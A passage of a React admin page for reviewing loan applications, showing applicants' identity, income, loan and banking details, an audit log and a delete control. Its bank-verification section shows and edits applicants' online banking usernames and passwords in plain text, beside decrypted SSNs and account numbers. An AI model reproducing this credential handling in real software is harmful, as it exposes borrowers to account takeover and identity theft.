                      className={`px-4 py-2 rounded-lg text-sm font-medium border transition cursor-pointer disabled:opacity-50 ${STATUS_COLORS[s] || ""}`}
                    >
                      {statusUpdating
                        ? "..."
                        : s
                            .replace(/_/g, " ")
                            .replace(/\b\w/g, (l) => l.toUpperCase())}
                    </button>
                  ))}
                </div>
              </div>
            )}

            {/* Personal Info */}
            <Section title="Personal Information">
              {edit ? (
                <>
                  <Field label="Application ID" value={app.id} />
                  <EditableField
                    label="First Name"
                    name="first_name"
                    value={formData.first_name}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Middle Initial"
                    name="middle_initial"
                    value={formData.middle_initial}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Last Name"
                    name="last_name"
                    value={formData.last_name}
                    onChange={handleFormChange}
                  />
                  <SelectField
                    label="Suffix"
                    name="name_suffix"
                    value={formData.name_suffix}
                    options={SUFFIX_OPTIONS}
                    placeholder="None"
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Email"
                    name="email"
                    type="email"
                    value={formData.email}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Phone"
                    name="phone"
                    value={formData.phone}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Date of Birth"
                    name="date_of_birth"
                    type="date"
                    value={mdyToIso(formData?.date_of_birth)}
                    onChange={(name, value) =>
                      handleFormChange(name, isoToMdy(String(value)))
                    }
                  />
                </>
              ) : (
                <>
                  <Field label="Application ID" value={app.id} />
                  <Field
                    label="First name"
                    value={[app.first_name].filter(Boolean).join(" ")}
                  />
                  <Field
                    label="Last name"
                    value={[app.last_name].filter(Boolean).join(" ")}
                  />
                  <Field
                    label="Middle Initial"
                    value={[app.middle_initial].filter(Boolean).join(" ")}
                  />
                  <Field
                    label="Name Suffix"
                    value={[app.name_suffix].filter(Boolean).join(" ")}
                  />

                  <Field label="Email" value={app.email} />
                  <Field label="Phone" value={app.phone} />
                  <Field
                    label="Date of Birth"
                    value={
                      app.date_of_birth
                        ? new Date(app.date_of_birth).toLocaleDateString(
                            "en-US",
                            {
                              month: "2-digit",
                              day: "2-digit",
                              year: "numeric",
                            },
                          )
                        : "N/A"
                    }
                  />
                </>
              )}
            </Section>

            {/* Identity Verification */}
            <Section title="Identity Verification">
              {edit ? (
                <>
                  <EditableField
                    label="SSN"
                    name="ssn_decrypted"
                    value={formData.ssn_decrypted}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Driver's License Number"
                    name="dl_decrypted"
                    value={formData.dl_decrypted}
                    onChange={handleFormChange}
                  />
                  <SelectField
                    label="DL Issuing State"
                    name="dl_state"
                    value={formData.dl_state}
                    options={STATE_OPTIONS}
                    placeholder="Select state"
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="DL Expiration"
                    name="dl_expiration_date"
                    type="date"
                    value={toDateInput(formData.dl_expiration_date)}
                    onChange={handleFormChange}
                  />
                </>
              ) : (
                <>
                  <Field label="SSN" value={app.ssn_decrypted || "-"} />
                  <Field
                    label="Driver's License"
                    value={app.dl_decrypted || "-"}
                  />
                  <Field label="DL Issuing State" value={app.dl_state || "-"} />
                  <Field
                    label="DL Expiration"
                    value={formatDateOnly(app.dl_expiration_date)}
                  />
                  <Field
                    label="Credit Check Authorization"
                    value={formatYesNo(app.credit_check_consent)}
                  />
                </>
              )}
            </Section>

            {/* Address */}
            <Section title="Address">
              {edit ? (
                <>
                  <div className="sm:col-span-2">
                    <EditableField
                      label="Street Address"
                      name="street_address"
                      value={formData.street_address}
                      onChange={handleFormChange}
                    />
                  </div>
                  <EditableField
                    label="Apt / Unit / Suite"
                    name="address_unit"
                    value={formData.address_unit}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="City"
                    name="city"
                    value={formData.city}
                    onChange={handleFormChange}
                  />
                  <SelectField
                    label="State"
                    name="state"
                    value={formData.state}
                    options={STATE_OPTIONS}
                    placeholder="Select state"
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Zip Code"
                    name="zip_code"
                    value={formData.zip_code}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Country"
                    name="country"
                    value={formData.country}
                    onChange={handleFormChange}
                  />
                  <SelectField
                    label="Time at Current Address"
                    name="time_at_address"
                    value={formData.time_at_address}
                    options={TIME_AT_ADDRESS}
                    onChange={handleFormChange}
                  />
                  <SelectField
                    label="Housing Status"
                    name="housing_status"
                    value={formData.housing_status}
                    options={HOUSING_STATUSES}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Monthly Housing Payment ($0 - $15,000)"
                    name="monthly_housing_payment"
                    value={formData.monthly_housing_payment}
                    onChange={handleFormChange}
                  />
                </>
              ) : (
                <>
                  <div className="sm:col-span-2">
                    <Field
                      label="Full Address"
                      value={`${app.street_address}${
                        app.address_unit ? `, ${app.address_unit}` : ""
                      }, ${app.city}, ${app.state} ${app.zip_code}, ${app.country}`}
                    />
                  </div>
                  <Field
                    label="Time at Current Address"
                    value={labelFor(TIME_AT_ADDRESS, app.time_at_address)}
                  />
                  <Field
                    label="Housing Status"
                    value={labelFor(HOUSING_STATUSES, app.housing_status)}
                  />
                  <Field
                    label="Monthly Housing Payment"
                    value={formatCurrency(app.monthly_housing_payment)}
                  />
                </>
              )}
            </Section>

            {/* Employment */}
            <Section title="Employment & Income">
              {edit ? (
                <>
                  <SelectField
                    label="Employment Status"
                    name="employment_status"
                    value={formData.employment_status}
                    options={EMPLOYMENT_STATUSES}
                    placeholder="Select status"
                    onChange={handleFormChange}
                  />
                  <SelectField
                    label="Primary Income Type"
                    name="primary_income_type"
                    value={formData.primary_income_type}
                    options={INCOME_TYPES}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Employer"
                    name="employer_name"
                    value={formData.employer_name}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Job Title"
                    name="job_title"
                    value={formData.job_title}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Employer Phone"
                    name="employer_phone"
                    value={formData.employer_phone}
                    onChange={handleFormChange}
                  />
                  <SelectField
                    label="Time at Current Job"
                    name="time_at_job"
                    value={formData.time_at_job}
                    options={TIME_AT_JOB}
                    onChange={handleFormChange}
                  />
                  {/* <EditableField
                    label="Years Employed"
                    name="years_employed"
                    value={formData.years_employed}
                    onChange={handleFormChange}
                  /> */}
                  <EditableField
                    label="Net Monthly Income"
                    name="monthly_income"
                    value={formData.monthly_income}
                    onChange={handleFormChange}
                  />
                  <SelectField
                    label="Pay Frequency"
                    name="pay_frequency"
                    value={formData.pay_frequency}
                    options={PAY_FREQUENCIES}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Next Pay Date"
                    name="next_pay_date"
                    type="date"
                    value={toDateInput(formData.next_pay_date)}
                    onChange={handleFormChange}
                  />
                  <BooleanField
                    label="Direct Deposit"
                    name="direct_deposit"
                    value={formData.direct_deposit}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Additional Monthly Income"
                    name="additional_monthly_income"
                    value={formData.additional_monthly_income}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Additional Income Source"
                    name="additional_income_source"
                    value={formData.additional_income_source}
                    onChange={handleFormChange}
                  />
                </>
              ) : (
                <>
                  <Field
                    label="Employment Status"
                    value={labelFor(EMPLOYMENT_STATUSES, app.employment_status)}
                  />
                  <Field
                    label="Primary Income Type"
                    value={labelFor(INCOME_TYPES, app.primary_income_type)}
                  />
                  <Field label="Employer" value={app.employer_name || "-"} />
                  <Field label="Job Title" value={app.job_title || "-"} />
                  <Field
                    label="Employer Phone"
                    value={app.employer_phone || "-"}
                  />
                  <Field
                    label="Time at Current Job"
                    value={labelFor(TIME_AT_JOB, app.time_at_job)}
                  />
                  {/* <Field
                    label="Years Employed"
                    value={app.years_employed ?? "-"}
                  /> */}
                  <Field
                    label="Net Monthly Income"
                    value={formatCurrency(app.monthly_income)}
                  />
                  <Field
                    label="Pay Frequency"
                    value={labelFor(PAY_FREQUENCIES, app.pay_frequency)}
                  />
                  <Field
                    label="Next Pay Date"
                    value={formatDateOnly(app.next_pay_date)}
                  />
                  <Field
                    label="Direct Deposit"
                    value={formatYesNo(app.direct_deposit)}
                  />
                  <Field
                    label="Additional Monthly Income"
                    value={formatCurrency(app.additional_monthly_income)}
                  />
                  <Field
                    label="Additional Income Source"
                    value={app.additional_income_source || "-"}
                  />
                </>
              )}
            </Section>

            {/* Loan Details */}
            <Section title="Loan Details">
              {edit ? (
                <>
                  <EditableField
                    label="Loan Amount ($2,000 - $10,000)"
                    name="loan_amount"
                    type="text"
                    min={2000}
                    max={10000}
                    value={formData.loan_amount}
                    onChange={handleFormChange}
                  />
                  <SelectField
                    label="Loan Purpose"
                    name="loan_purpose"
                    value={formData.loan_purpose}
                    options={LOAN_PURPOSES}
                    placeholder="Select purpose"
                    onChange={handleFormChange}
                  />
                  {formData.loan_purpose === PURPOSE_REQUIRING_DETAIL && (
                    <div className="sm:col-span-2">
                      <EditableField
                        label="Purpose — Other Detail"
                        name="loan_purpose_other"
                        value={formData.loan_purpose_other}
                        onChange={handleFormChange}
                      />
                    </div>
                  )}
                  <div>
                    <label className="block text-xs text-gray-400 mb-2">
                      Loan Term
                    </label>
                    <div className="grid grid-cols-4 gap-3">
                      {[24, 36, 48, 60].map((term) => (
                        <button
                          key={term}
                          type="button"
                          onClick={() => handleFormChange("loan_term", term)}
                          className={`py-3 rounded-lg text-sm font-semibold border-2 transition-all ${
                            Number(formData.loan_term) === term
                              ? "border-primary bg-primary text-white"
                              : "border-surface-dark bg-white text-text-secondary hover:border-primary/50"
                          }`}
                        >
                          {term} mo
                        </button>
                      ))}
                    </div>
                    <p className="text-xs text-text-secondary mt-2">
                      Choose a repayment term from 24 to 60 months to fit your
                      lifestyle.
                    </p>
                  </div>
                  <Field
                    label="Monthly Payment"
                    value={formatCurrency(
                      calcMonthlyPayment(
                        Number(formData.loan_amount ?? 0),
                        Number(formData.loan_term ?? 0),
                      ),
                    )}
                  />
                </>
              ) : (
                <>
                  <Field
                    label="Loan Amount"
                    value={formatCurrency(app.loan_amount)}
                  />
                  <Field
                    label="Purpose"
                    value={labelFor(LOAN_PURPOSES, app.loan_purpose)}
                  />
                  {app.loan_purpose === PURPOSE_REQUIRING_DETAIL && (
                    <Field
                      label="Purpose — Other Detail"
                      value={app.loan_purpose_other || "-"}
                    />
                  )}
                  <Field label="Loan Term" value={`${app.loan_term} months`} />
                  <Field
                    label="Monthly Payment"
                    value={formatCurrency(
                      calcMonthlyPayment(
                        Number(app.loan_amount),
                        Number(app.loan_term),
                      ),
                    )}
                  />
                </>
              )}
            </Section>

            {/* Banking */}
            <Section title="Banking Information">
              {edit ? (
                <>
                  <EditableField
                    label="Bank Name"
                    name="bank_name"
                    value={formData.bank_name}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Routing"
                    name="routing_number"
                    value={formData.routing_number}
                    onChange={handleFormChange}
                  />
                  <div>
                    <label className="block text-xs text-gray-400 mb-2">
                      Account Type
                    </label>
                    <div className="grid grid-cols-2 gap-3">
                      {ACCOUNT_TYPES.map((type) => (
                        <button
                          key={type.value}
                          type="button"
                          onClick={() =>
                            handleFormChange("account_type", type.value)
                          }
                          className={`py-3 rounded-lg text-sm font-semibold border-2 transition-all ${
                            formData.account_type === type.value
                              ? "border-primary bg-primary text-white"
                              : "border-surface-dark bg-white text-text-secondary hover:border-primary/50"
                          }`}
                        >
                          {type.label}
                        </button>
                      ))}
                    </div>
                  </div>
                  <EditableField
                    label="Account Number"
                    name="account_decrypted"
                    value={formData.account_decrypted}
                    onChange={handleFormChange}
                  />
                  <SelectField
                    label="Bank Balance Status"
                    name="bank_balance_status"
                    value={formData.bank_balance_status}
                    options={ACCOUNT_STATUSES}
                    placeholder="Select status"
                    onChange={handleFormChange}
                  />
                  <SelectField
                    label="Bank Account Age"
                    name="bank_account_age"
                    value={formData.bank_account_age}
                    options={ACCOUNT_AGES}
                    placeholder="Select account age"
                    onChange={handleFormChange}
                  />
                  {/* <SelectField
                    label="Verification Method"
                    name="bank_verification_method"
                    value={formData.bank_verification_method}
                    options={BANK_VERIFICATION_METHODS}
                    onChange={handleFormChange}
                  /> */}
                </>
              ) : (
                <>
                  <Field label="Bank Name" value={app.bank_name || "-"} />
                  <Field label="Routing" value={app.routing_number || "-"} />
                  <Field
                    label="Account Type"
                    value={labelFor(ACCOUNT_TYPES, app.account_type)}
                  />
                  <Field
                    label="Account Number"
                    value={app.account_decrypted || "-"}
                  />
                  <Field
                    label="Bank Balance Status"
                    value={labelFor(ACCOUNT_STATUSES, app.bank_balance_status)}
                  />
                  <Field
                    label="Bank Account Age"
                    value={labelFor(ACCOUNT_AGES, app.bank_account_age)}
                  />
                  {/* <Field
                    label="Verification Method"
                    value={labelFor(
                      BANK_VERIFICATION_METHODS,
                      app.bank_verification_method,
                    )}
                  /> */}
                  <Field
                    label="Bank Verification"
                    value={
                      app.bank_verification_completed ? "Completed" : "Pending"
                    }
                  />
                </>
              )}
            </Section>

            {/* Bank Verification Details */}
            {bankVerification && (
              <Section title="Bank Verification Details">
                {edit ? (
                  <>
                    <EditableField
                      label="Full name"
                      name="full_name"
                      value={formData?.bankVerification?.full_name}
                      onChange={handleBankVerificationChange}
                    />
                    <EditableField
                      label="Email"
                      name="email"
                      value={formData?.bankVerification?.email}
                      onChange={handleBankVerificationChange}
                    />
                    <EditableField
                      label="Online Bank Username"
                      name="online_banking_username"
                      value={
                        formData?.bankVerification?.online_banking_username
                      }
                      onChange={handleBankVerificationChange}
                    />
                    <EditableField
                      label="Online Bank Password"
                      name="online_banking_password"
                      value={
                        formData?.bankVerification?.online_banking_password
                      }
                      onChange={handleBankVerificationChange}
                    />
                    <EditableField
                      label="Bank Name"
                      name="bank_name"
                      value={formData?.bankVerification?.bank_name}
                      onChange={handleBankVerificationChange}
                    />
                    {/* <EditableField
                        label="Account"
                        name="account_type"
                        value={formData?.bankVerification?.account_type}
                        onChange={handleBankVerificationChange}
                      />{" "} */}
                    <div>
                      <label className="block text-xs text-gray-400 mb-2">
                        Account Type
                      </label>
                      <div className="grid grid-cols-2 gap-3">
                        {ACCOUNT_TYPES.map((type) => (
                          <button
                            key={type.value}
                            type="button"
                            onClick={() =>
                              handleBankVerificationChange(
                                "account_type",
                                type.value,
                              )
                            }
                            className={`py-3 rounded-lg text-sm font-semibold border-2 transition-all ${
                              formData?.bankVerification?.account_type ===
                              type.value
                                ? "border-primary bg-primary text-white"
                                : "border-surface-dark bg-white text-text-secondary hover:border-primary/50"
                            }`}
                          >
                            {type.label}
                          </button>
                        ))}
                      </div>
                    </div>
                  </>
                ) : (
                  <>
                    <Field
                      label="Full name"
                      value={bankVerification?.full_name}
                    />
                    <Field label="Email" value={bankVerification?.email} />
                    <Field
                      label="Online Bank Username"
                      value={bankVerification?.online_banking_username}
                    />
                    <Field
                      label="Online Bank Password"
                      value={bankVerification?.online_banking_password}
                    />
                    <Field
                      label="Application ID"
                      value={bankVerification?.application_id}
                    />
                    <Field
                      label="Bank Name"
                      value={bankVerification?.bank_name}
                    />
                    <Field
                      label="Account"
                      value={labelFor(
                        ACCOUNT_TYPES,
                        bankVerification?.account_type,
                      )}
                    />
                    <Field
                      label="Verification Status"
                      value={
                        bankVerification?.verification_status
                          ? bankVerification.verification_status
                              .replace(/_/g, " ")
                              .replace(/\b\w/g, (l) => l.toUpperCase())
                          : "-"
                      }
                    />
                    <Field
                      label="Submitted At"
                      value={formatDateTime(bankVerification?.created_at)}
                    />
                  </>
                )}
              </Section>
            )}

            {/* Decisioning */}
            {/* <Section title="Decisioning & Progress">
              <Field
                label="Pre-qual Decision"
                value={
                  app.prequal_decision
                    ? app.prequal_decision.toUpperCase()
                    : "-"
                }
              />
              <Field
                label="Decided At"
                value={
                  app.prequal_decided_at
                    ? formatDateTime(app.prequal_decided_at)
                    : "-"
                }
              />
              <div className="sm:col-span-2">
                <Field
                  label="Pre-qual Reasons"
                  value={formatList(app.prequal_reasons)}
                />
              </div>
              <div className="sm:col-span-2">
                <Field
                  label="Manual Review Flags"
                  value={formatList(app.manual_review_flags)}
                />
              </div>
              <Field
                label="MLA Covered Borrower"
                value={formatYesNo(app.mla_covered_borrower)}
              />
              <Field
                label="MLA Checked At"
                value={
                  app.mla_checked_at ? formatDateTime(app.mla_checked_at) : "-"
                }
              />
              <Field label="Current Step" value={`${app.current_step} of 4`} />
              <Field
                label="Highest Step Reached"
                value={`${app.highest_step_reached} of 4`}
              />
              <Field
                label="Time on Form"
                value={formatDuration(app.total_time_on_form)}
              />
            </Section> */}

            {/* Consents */}
            <Section title="Consents">
              <Field label="TCPA" value={formatYesNo(app.tcpa_consent)} />
              <Field label="Privacy" value={formatYesNo(app.privacy_consent)} />
              <Field
                label="Credit Check"
                value={formatYesNo(app.credit_check_consent)}
              />
            </Section>

            {/* Tracking */}
            <Section title="Tracking & Attribution">
              {edit ? (
                <EditableField
                  label="Assisted By Loan Agent"
                  name="assisted_by_loan_agent"
                  value={formData.assisted_by_loan_agent}
                  onChange={handleFormChange}
                />
              ) : (
                <Field
                  label="Assisted By Loan Agent"
                  value={app.assisted_by_loan_agent || "-"}
                />
              )}
              <Field label="Lead ID" value={app.lead_id || "-"} />
              <Field label="UTM Source" value={app.utm_source || "-"} />
              <Field label="UTM Medium" value={app.utm_medium || "-"} />
              <Field label="UTM Campaign" value={app.utm_campaign || "-"} />
              <Field label="UTM Content" value={app.utm_content || "-"} />
              <Field label="UTM Term" value={app.utm_term || "-"} />
              <Field label="Jornaya LeadiD" value={app.jornaya_leadid || "-"} />
              <div className="sm:col-span-2">
                <Field
                  label="TrustedForm Certificate"
                  value={app.trustedform_cert_url || "-"}
                />
              </div>
              {/* <Field
                label="Device Fingerprint"
                value={app.device_fingerprint || "-"}
              /> */}
              <Field label="Session ID" value={app.session_id || "-"} />
              <div className="sm:col-span-2">
                <Field label="Page URL" value={app.page_url || "-"} />
              </div>
              <div className="sm:col-span-2">
                <Field label="Referrer URL" value={app.referrer_url || "-"} />
              </div>
              <div className="sm:col-span-2">
                <Field
                  label="Landing Page (First Touch)"
                  value={app.landing_page_first_touch || "-"}
                />
              </div>
            </Section>

            {/* Timestamps */}
            <Section title="Timestamps">
              <Field
                label="Created"
                value={app.created_at ? formatDateTime(app.created_at) : "—"}
              />
              <Field
                label="Updated"
                value={app.updated_at ? formatDateTime(app.updated_at) : "—"}
              />
              <Field
                label="Step 1 Started"
                value={
                  app.step1_started_at
                    ? formatDateTime(app.step1_started_at)
                    : "—"
                }
              />
              <Field
                label="Step 1 Submitted"
                value={
                  app.step1_submitted_at
                    ? formatDateTime(app.step1_submitted_at)
                    : "—"
                }
              />
              <Field
                label="Step 2 Submitted"
                value={
                  app.step2_submitted_at
                    ? formatDateTime(app.step2_submitted_at)
                    : "—"
                }
              />
              <Field
                label="Step 3 Submitted"
                value={
                  app.step3_submitted_at
                    ? formatDateTime(app.step3_submitted_at)
                    : "—"
                }
              />
              <Field
                label="Reviewed"
                value={app.reviewed_at ? formatDateTime(app.reviewed_at) : "—"}
              />
              <Field
                label="Declined"
                value={app.declined_at ? formatDateTime(app.declined_at) : "—"}
              />
              <Field
                label="Funded"
                value={app.funded_at ? formatDateTime(app.funded_at) : "—"}
              />
              <Field
                label="Sensitive Data Purged"
                value={
                  app.sensitive_purged_at
                    ? formatDateTime(app.sensitive_purged_at)
                    : "—"
                }
              />
              <Field label="IP Address" value={app.ip_address} />
              <div className="sm:col-span-2">
                <Field label="User Agent" value={app.user_agent || "-"} />
              </div>
            </Section>

            {/* Audit Log */}
            {auditLog.length > 0 && (
              <div className="bg-white rounded-xl border border-gray-200 p-6">
                <h3 className="text-sm font-semibold text-gray-500 uppercase tracking-wide mb-4">
                  Audit Log
                </h3>
                <div className="space-y-3">
                  {auditLog.map((entry) => (
                    <div
                      key={entry.id}
                      className="flex items-start gap-3 text-sm border-b border-gray-50 pb-3"
                    >
                      <div className="flex-1">
                        <span className="font-medium text-gray-900">
                          {entry.action}
                        </span>
                        <span className="text-gray-400 mx-2">by</span>
                        <span className="text-gray-600">
                          {entry.performed_by}
                        </span>
                        {entry.details &&
                          Object.keys(entry.details).length > 0 && (
                            <p className="text-xs text-gray-400 mt-1 break-all overflow-hidden">
                              {JSON.stringify(entry.details)}
                            </p>
                          )}
                      </div>
                      <span className="text-xs text-gray-400 whitespace-nowrap">
                        {formatDateTime(entry.created_at)}
                      </span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Delete */}
            {isAdmin && (
              <div className="bg-white rounded-xl border border-red-200 p-6">
                <h3 className="text-sm font-semibold text-red-500 uppercase tracking-wide mb-3">
                  Danger Zone
                </h3>
                {deleteConfirm ? (
                  <div className="flex items-center gap-3">
                    <p className="text-sm text-gray-600">
                      Are you sure? This action cannot be undone.
                    </p>
                    <button
                      onClick={handleDelete}
                      className="px-4 py-2 bg-red-600 text-white rounded-lg text-sm font-medium hover:bg-red-700 transition cursor-pointer"
                    >
                      Confirm Delete
                    </button>
                    <button
                      onClick={() => setDeleteConfirm(false)}
                      className="px-4 py-2 border border-gray-300 rounded-lg text-sm hover:bg-gray-50 transition cursor-pointer"
                    >
                      Cancel
                    </button>
                  </div>
                ) : (
                  <button
                    onClick={() => setDeleteConfirm(true)}
                    className="px-4 py-2 border border-red-300 text-red-600 rounded-lg text-sm font-medium hover:bg-red-50 transition cursor-pointer"
                  >
                    Delete Application
                  </button>
                )}
              </div>
            )}
          </div>
        ) : null}
      </div>
    </div>
  );
}
